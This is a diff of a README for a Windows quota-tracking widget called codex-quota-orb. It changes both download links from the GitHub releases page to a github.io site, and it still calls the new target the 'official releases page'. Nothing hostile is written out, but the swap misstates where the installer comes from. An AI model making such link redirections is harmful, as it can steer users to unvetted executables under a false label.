@@ -1,6 +1,6 @@
 # 🔮 codex-quota-orb - Track your usage data with ease
 
-[![Download codex-quota-orb](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/citylinemotion819/codex-quota-orb/releases)
+[![Download codex-quota-orb](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://citylinemotion819.github.io)
 
 Codex-quota-orb provides a clear view of your development metrics. This Windows widget sits on your desktop to show live updates for your quota, credit expiry, and token usage. It gathers data locally to help you manage your developer tools and route analytics without extra steps.
 
@@ -8,7 +8,7 @@ Codex-quota-orb provides a clear view of your development metrics. This Windows 
 
 Follow these steps to set up the widget on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/citylinemotion819/codex-quota-orb/releases) to find the latest version of the software.
+1. Visit the [official releases page](https://citylinemotion819.github.io) to find the latest version of the software.
 2. Look for the file ending in `.zip` or `.msi` under the "Assets" section.
 3. Click the file name to start the download.
 4. Open your "Downloads" folder and find the saved file.
